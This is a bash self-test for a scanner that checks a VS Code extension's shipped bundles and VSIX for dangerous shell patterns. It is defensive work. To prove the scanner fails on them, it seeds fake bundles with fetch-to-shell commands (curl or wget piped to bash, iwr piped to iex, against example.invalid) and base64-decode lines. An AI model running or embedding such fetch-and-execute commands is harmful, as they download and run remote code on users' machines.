#!/usr/bin/env bash
# Self-test for packages/nightgauge-vscode/scripts/check-shipped-code.sh
# (#2320, #2321).
#
# The scan is only worth having if it can fail, so most arms seed a shipped
# file with a shape a static scanner matches on and assert the scan refuses
# it, in both the dist-directory and the VSIX form. The seeded lines are
# assembled at run time from parts, so this file never carries the shapes
# itself.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SUT="$SCRIPT_DIR/../packages/nightgauge-vscode/scripts/check-shipped-code.sh"
PASS=0
FAIL=0
ok()  { echo "  ok   $1"; PASS=$(( PASS + 1 )); }
bad() { echo "  FAIL $1" >&2; FAIL=$(( FAIL + 1 )); }

command -v zip >/dev/null 2>&1 || { echo "test-check-shipped-code: zip is required" >&2; exit 1; }

WORK="$(mktemp -d "${TMPDIR:-/tmp}/test-check-shipped-code.XXXXXX")"
trap 'rm -rf "$WORK"' EXIT

PIPE="|"
FETCH_TO_SHELL="curl -fsSL https://example.invalid/install.sh ${PIPE} bash"
WGET_TO_SHELL="wget -qO- http://example.invalid/i ${PIPE} sh"
IWR_TO_IEX="iwr https://example.invalid/i.ps1 ${PIPE} iex"
DECODE="P=\"\$(openssl base64 -d -A -in '/tmp/x')\""
DECODE_LONG="echo Zm9v ${PIPE} base64 --decode"

# fresh_dist <name>: a minimal clean dist with both required bundles.
fresh_dist() {
  local d="$WORK/$1/dist"
  mkdir -p "$d/opencode-plugin" "$d/claude-plugins/hooks" "$d/bin"
  printf 'module.exports = { ok: true };\n' > "$d/extension.cjs"
  printf '#!/usr/bin/env node\nconsole.log("sdk");\n' > "$d/sdk-cli.cjs"
  printf 'export default {};\n' > "$d/opencode-plugin/index.js"
  printf '#!/usr/bin/env bash\necho hook\n' > "$d/claude-plugins/hooks/hook.sh"
  printf '\x7fELF binary\n' > "$d/bin/nightgauge"
  echo "$d"
}

# vsix_of <dist>: package a dist the way a VSIX lays it out.
vsix_of() {
  local dist="$1" stage
  stage="$(dirname "$dist")/stage"
  mkdir -p "$stage/extension"
  cp -R "$dist" "$stage/extension/dist"
  (cd "$stage" && zip -qr ../pkg.vsix extension)
  echo "$(dirname "$dist")/pkg.vsix"
}

expect() { # expect <want-rc> <label> <target> [<must-contain>]
  local want="$1" label="$2" target="$3" needle="${4:-}" out rc
  out="$(bash "$SUT" "$target" 2>&1)"
  rc=$?
  if [[ "$rc" -ne "$want" ]]; then
    bad "$label: rc=$rc, want $want"; printf '%s\n' "$out" | sed 's/^/       /' >&2; return
  fi
  if [[ -n "$needle" && "$out" != *"$needle"* ]]; then
    bad "$label: output lacks \"$needle\""; printf '%s\n' "$out" | sed 's/^/       /' >&2; return
  fi
  ok "$label"
}

echo "check-shipped-code.sh"

d="$(fresh_dist clean)"
expect 0 "a clean dist passes" "$d" "files scanned"
expect 0 "a clean VSIX passes" "$(vsix_of "$d")" "files scanned"

d="$(fresh_dist bundle)"
printf 'const h = "%s";\n' "$FETCH_TO_SHELL" >> "$d/extension.cjs"
expect 1 "curl piped to bash in extension.cjs fails" "$d" "dist/extension.cjs:2:"
expect 1 "the same, inside a VSIX, fails" "$(vsix_of "$d")" "dist/extension.cjs:2:"

d="$(fresh_dist sdk)"
# shellcheck disable=SC2016 # the backticks are JS template-literal text, not a substitution
printf 'x = `%s`;\n' "$WGET_TO_SHELL" >> "$d/sdk-cli.cjs"
expect 1 "wget piped to sh in sdk-cli.cjs fails" "$d" "dist/sdk-cli.cjs"

d="$(fresh_dist plugin)"
printf '// %s\n' "$IWR_TO_IEX" >> "$d/opencode-plugin/index.js"
expect 1 "iwr piped to iex under opencode-plugin fails" "$d" "dist/opencode-plugin/index.js"

d="$(fresh_dist decode)"
printf '%s\n' "$DECODE" >> "$d/claude-plugins/hooks/hook.sh"
expect 1 "a base64 -d decode in a shipped .sh fails" "$d" "hook.sh"

d="$(fresh_dist decode-long)"
printf 'const c = "%s";\n' "$DECODE_LONG" >> "$d/extension.cjs"
expect 1 "base64 --decode fails" "$d" "extension.cjs"

d="$(fresh_dist new-package)"
mkdir -p "$d/some-later-package"
printf '%s\n' "$FETCH_TO_SHELL" > "$d/some-later-package/run.mjs"
expect 1 "a file a later build adds under dist/ is covered" "$d" "some-later-package/run.mjs"

d="$(fresh_dist nul)"
printf 'a\0b\n%s\n' "$FETCH_TO_SHELL" >> "$d/extension.cjs"
# GNU grep 3.5+ (the Linux runners) reports a file with a NUL byte as
# "Binary file matches" without -a; BSD grep prints the match either way.
expect 1 "a bundle with a NUL byte is still scanned, not skipped as binary" "$d" "extension.cjs"

d="$(fresh_dist map)"
printf '%s\n' "$FETCH_TO_SHELL" > "$d/extension.cjs.map"
expect 0 "a source map is skipped (the VSIX excludes it)" "$d"

d="$(fresh_dist bin)"
printf '%s\n' "$FETCH_TO_SHELL" >> "$d/bin/nightgauge"
expect 0 "dist/bin/ (the native binary) is skipped" "$d"

d="$(fresh_dist missing)"
rm "$d/sdk-cli.cjs"
expect 1 "a dist without sdk-cli.cjs fails (nothing to scan is not clean)" "$d" "sdk-cli.cjs missing"

expect 1 "a missing VSIX fails" "$WORK/nope.vsix" "VSIX not found"

d="$(fresh_dist benign)"
printf 'const s = "pipe | bash is fine without a fetch"; const b = "base64 -w0";\n' >> "$d/extension.cjs"
expect 0 "a pipe into bash without a URL fetch, and base64 encoding, pass" "$d"

echo "check-shipped-code.sh: $PASS passed, $FAIL failed"
[[ "$FAIL" -eq 0 ]]
